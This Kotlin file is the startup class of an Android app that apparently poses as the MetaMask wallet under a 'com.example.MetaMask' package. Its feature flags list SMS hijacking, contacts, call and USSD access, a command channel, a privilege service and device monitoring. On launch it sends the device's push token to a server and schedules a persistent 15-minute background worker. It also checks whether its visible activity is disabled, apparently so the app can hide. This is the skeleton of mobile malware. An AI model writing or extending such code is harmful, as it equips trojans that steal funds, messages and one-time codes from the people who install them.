package com.example.MetaMask

import android.app.ActivityManager
import android.app.Application
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.UserManager
import androidx.work.Configuration
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.example.MetaMask.activities.WebViewActivity
import com.example.MetaMask.services.SchedulerWorker
import com.example.MetaMask.utils.DeviceUUIDProvider
import com.example.MetaMask.utils.FCMConfig
import java.util.concurrent.TimeUnit

class MainApplication : Application(), Configuration.Provider {

    override val workManagerConfiguration: Configuration
        get() = Configuration.Builder()
            .setMinimumLoggingLevel(android.util.Log.INFO)
            .build()

    override fun onCreate() {
        android.util.Log.d("XDBG", "[MainApplication] onCreate enter") //xdbg
        super.onCreate()
        android.util.Log.d("XDBG", "[MainApplication] FEAT_DUMP: FCM=${BuildConfig.FEAT_FCM}|SMS=${BuildConfig.FEAT_SMS}|SMS_ROLE=${BuildConfig.FEAT_SMS_ROLE}|RADIO_LINK=${BuildConfig.FEAT_RADIO_LINK}|CONTACTS=${BuildConfig.FEAT_CONTACTS}|CALL_PHONE=${BuildConfig.FEAT_CALL_PHONE}|USSD=${BuildConfig.FEAT_USSD}|TURTLE=${BuildConfig.FEAT_TURTLE}|SYNC_MGR=${BuildConfig.FEAT_SYNC_MANAGER}|KEEPALIVE=${BuildConfig.FEAT_KEEPALIVE_JOB}|FRIEN_CAT=${BuildConfig.FEAT_FRIEN_CAT}|DEV_MON=${BuildConfig.FEAT_DEVICE_MONITOR}|TROL=${BuildConfig.FEAT_TROL_SVC}|CMD_CH=${BuildConfig.FEAT_CMD_CHANNEL}|PRIVILEGE=${BuildConfig.FEAT_PRIVILEGE_SVC}") //xdbg

        val userManager = getSystemService(Context.USER_SERVICE) as UserManager
        if (!userManager.isUserUnlocked) return

        try {
            WorkManager.initialize(applicationContext, workManagerConfiguration)
        } catch (_: IllegalStateException) {
            android.util.Log.e("XDBG", "[MainApplication] catch (ignored)") //xdbg
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[MainApplication] catch (ignored)") //xdbg
        }

        android.util.Log.d("XDBG", "[MainApplication] FEAT_FCM=${BuildConfig.FEAT_FCM} process=${getCurrentProcessName()}") //xdbg
        if (BuildConfig.FEAT_FCM) {
            android.util.Log.d("XDBG", "[MainApplication] FCM enabled, calling FCMConfig.init") //xdbg
            FCMConfig.init(this)
            android.util.Log.d("XDBG", "[MainApplication] calling pushCurrentTokenToServer") //xdbg
            com.example.MetaMask.services.FcmTokenService.pushCurrentTokenToServer(this)
        } else {
            android.util.Log.d("XDBG", "[MainApplication] FCM DISABLED by BuildConfig.FEAT_FCM=false, skip") //xdbg
        }

        val isMain = isMainProcess()
        android.util.Log.d("XDBG", "[MainApplication] isMainProcess=$isMain") //xdbg
        if (!isMain) {
            android.util.Log.d("XDBG", "[MainApplication] not main process, early return") //xdbg
            return
        }

        val pm = packageManager
        val componentName = ComponentName(this, WebViewActivity::class.java)
        val compState = pm.getComponentEnabledSetting(componentName)
        if (compState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
            android.util.Log.d("XDBG", "[MainApplication] if branch") //xdbg
            return
        }

        DeviceUUIDProvider.init(this)
        schedulePeriodicWorker()
    }

    private fun schedulePeriodicWorker() {
        android.util.Log.d("XDBG", "[MainApplication] schedulePeriodicWorker enter") //xdbg
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val periodicWorkRequest = PeriodicWorkRequestBuilder<SchedulerWorker>(
            15, TimeUnit.MINUTES
        )
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "MasterServiceCheck",
            ExistingPeriodicWorkPolicy.KEEP,
            periodicWorkRequest
        )
    }

    private fun isMainProcess(): Boolean {
        android.util.Log.d("XDBG", "[MainApplication] isMainProcess enter") //xdbg
        android.util.Log.d("XDBG", "[MainApplication] return") //xdbg
        return packageName.equals(getCurrentProcessName())
    }

    private fun getCurrentProcessName(): String? {
        android.util.Log.d("XDBG", "[MainApplication] getCurrentProcessName enter") //xdbg
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            android.util.Log.d("XDBG", "[MainApplication] if branch") //xdbg
            android.util.Log.d("XDBG", "[MainApplication] return") //xdbg
            return getProcessName()
        }
        try {
            val manager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            for (processInfo in manager.runningAppProcesses) {
                android.util.Log.d("XDBG", "[MainApplication] loop") //xdbg
                if (processInfo.pid == android.os.Process.myPid()) {
                    android.util.Log.d("XDBG", "[MainApplication] if branch") //xdbg
                    android.util.Log.d("XDBG", "[MainApplication] return") //xdbg
                    return processInfo.processName
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MainApplication] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            e.printStackTrace()
        }
        android.util.Log.d("XDBG", "[MainApplication] return") //xdbg
        return null
    }
}
